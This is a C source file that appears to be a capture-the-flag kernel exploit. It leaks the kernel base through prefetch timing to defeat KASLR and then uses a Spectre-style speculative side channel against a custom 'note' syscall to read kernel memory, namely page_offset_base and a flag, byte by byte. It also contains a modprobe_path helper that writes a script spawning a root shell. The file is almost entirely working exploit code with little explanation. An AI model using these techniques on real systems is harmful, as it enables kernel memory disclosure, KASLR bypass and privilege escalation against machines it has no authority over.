#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <err.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <x86intrin.h>
#include <ctype.h>
#include <stdarg.h>
#include <stdbool.h>
#include <emmintrin.h>

// commands
#define DEV_PATH "/dev/challenge"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

ulong user_cs,user_ss,user_sp,user_rflags;
// should compile with -masm=intel
static void save_state() {
    __asm__("mov %0, cs\n"
            "mov %1, ss\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
            :
            :"memory"
    );
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

#define WRITE_NOTE 0x1ce
#define READ_NOTE 0x1cf

void write_note(uint8_t* buf, size_t sz) {
    syscall(WRITE_NOTE, buf, sz);
}

void write_note_check(uint8_t* buf, size_t sz) {
    if (syscall(WRITE_NOTE, buf, sz) < 0) {
        errExit("write_note_check");
    }
}

void read_note(uint8_t* buf, uint64_t idx1, uint64_t idx2, uint64_t stride) {
    syscall(READ_NOTE, buf, idx1, idx2, stride);
}

void read_note_check(uint8_t* buf, uint64_t idx1, uint64_t idx2, uint64_t stride) {
    if (syscall(READ_NOTE, buf, idx1, idx2, stride) < 0) {
        errExit("read_note_check");
    }
}

__attribute__((naked)) uint64_t time_access(volatile void *p){
    asm volatile(
        "push rbx;"
        "mfence;"
        "xor rax, rax;"
        "mfence;"
        "rdtscp;"         // before
        "mov rbx, rax;"
        "mov rdi, [rdi];" // RELOAD
        "rdtscp;"         // after
        "mfence;"
        "sub rax, rbx;"   // return after - before
        "pop rbx;"
        "ret;" :::
    );
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

static inline int get_access_time(volatile char *addr)
{
    unsigned long long time1, time2;
    unsigned junk;
    time1 = __rdtscp(&junk);
    (void)*addr;
    time2 = __rdtscp(&junk);
    return time2 - time1;
}

#define CACHE_LINE_SIZE 64
#define L1_CACHE_SIZE (64 * 1024)
#define NUM_ADDRESSES (L1_CACHE_SIZE / CACHE_LINE_SIZE)

#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

static int cache_hit_threshold;
static int hist[VARIANTS_READ];

static char target_array[VARIANTS_READ * TARGET_SIZE];
//static char junk_array[VARIANTS_READ * TARGET_SIZE * 10];
#define ESTIMATE_CYCLES	1000000
// https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
static void set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

    /*
	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);
    */

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}

int pseudo_sleep(size_t iter){
    for (size_t i = 0; i < iter; i++) {
        _mm_pause();
        //asm("");
    }
}

void clflush_target(void)
{
	int i;
	for (i = 0; i < VARIANTS_READ; i++) {
		_mm_clflush(&target_array[i * TARGET_SIZE]);
    }
    pseudo_sleep(100000);
}


void check(void)
{
	int i, time, mix_i;
	char *addr;
	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);

        // prevents prefetching of the array
        _mm_clflush(addr);

		if (time <= cache_hit_threshold)
			hist[mix_i]++;
	}
}

void check2(int i)
{
	volatile char* addr = &target_array[i * TARGET_SIZE];
	int time = get_access_time(addr);

	if (time <= cache_hit_threshold)
        hist[i]++;
}


#define FLAG_OFFSET 0x239780
#define FLAG_OFFSET_PAGE_OFFSET_BASE 0x1f389000


static char buf2[0x1000] = {0};
void train_branch_predictor() {
    for (int i = 0; i < 100; ++i) {
        read_note_check(buf2, i % 0xf, i%8, 0);
    }
}

static char junk_array[128 * 1024 * 1024];
void evict_note_from_cache() {
    for (int i = 0; i < sizeof(junk_array); i += CACHE_LINE_SIZE) {
        junk_array[i] = i;
    }
}

#define CYCLES 100
int read_byte(uint64_t off) {
    int i, ret = 0, max = -1, maxi = -1;
    uint64_t training;
    uint64_t x;

    memset(hist, 0, sizeof(hist));

    for (i = 0; i < CYCLES; ++i) {
        training = i % 0xf;


        /*
        clflush_target();
        evict_note_from_cache();
        _mm_mfence();
        read_note(target_array, off, training, 12);
        check();
        */

        for (int j = 0; j < 30; ++j) {
            clflush_target();
            evict_note_from_cache();
            //_mm_mfence();
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training ^ (x & (off ^ training));
            read_note(target_array, x, training, 12);
            check();
        }
        //clflush_target();
        //_mm_mfence();
        //check();
    }

    for (i = 0; i < VARIANTS_READ; i++) {
        if (i == 0x44) {
            continue;
        }
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}

	return maxi;
}

// 1 cpu

//Cache L1: 	64 KB (per core)
//Cache L2: 	256 KB (per core)
//Cache L3: 	6 MB (shared)

// FLAG off: 0x239780

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define entry_SYSCALL_64_offset 0x1000080ull

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t leak_syscall_entry(void)
{
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
        //printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }

    return addr;
}

#define page_offset_base_offset 0x17fc1f8
#define cor_ctf_note_offset 0x24d2880

static void print_hist_info() {
    for(int i = 0; i < sizeof(hist); ++i) {
        if (hist[i] > 0) {
            printf("%x: %d \n", i, hist[i]);
        }
    }
}

int main(void) {
    int ret;
    int c;

    puts("Enter");
    set_cache_hit_threshold();

    uint64_t k_base = leak_syscall_entry() - entry_SYSCALL_64_offset;
    info("Kernel base: %p \n", k_base);

    uint64_t page_offset_base_addr = k_base + page_offset_base_offset;
    info("Page offset base addr: %p \n", page_offset_base_addr);

    char buf[0x10];
    memset(buf, 0x44, sizeof(buf)-1);
    //buf[0] = 0x63;
    //buf[1] = 0x42;
    write_note_check(buf, 0xf);

    uint64_t page_offset_base = 0;

    // basic check to test caching behavior
    // c = read_byte(0);
    //assert((char)c == 'c');

    uint64_t cor_ctf_note = k_base + 0x24d2880;

    // first 3 bytes are 0
    // 0xffff9f1480000000
    for (int i = 3; i < sizeof(page_offset_base); ++i) {
        // page_offset_base is before cor_ctf_note so need to wrap around
        int c = read_byte(page_offset_base_offset - cor_ctf_note_offset +i);

        if (c < 0) {
            errExit("Failed to leak");
        }

        page_offset_base |= ((uint64_t)c) << (i*8);
        printf("current page_offset_base: %p, %d \n", page_offset_base, c);
        print_hist_info();

    }

    info("Page_offset_base val: %p \n", page_offset_base);

    return 0;

    c = read_byte(FLAG_OFFSET);
    printf("Read: %c \n", c);
    for (int i = 0; i < VARIANTS_READ; ++i) {
        printf("Hist: %d \n", hist[i]);
    }

    // 0xffff88801f388000

    WAIT();
}
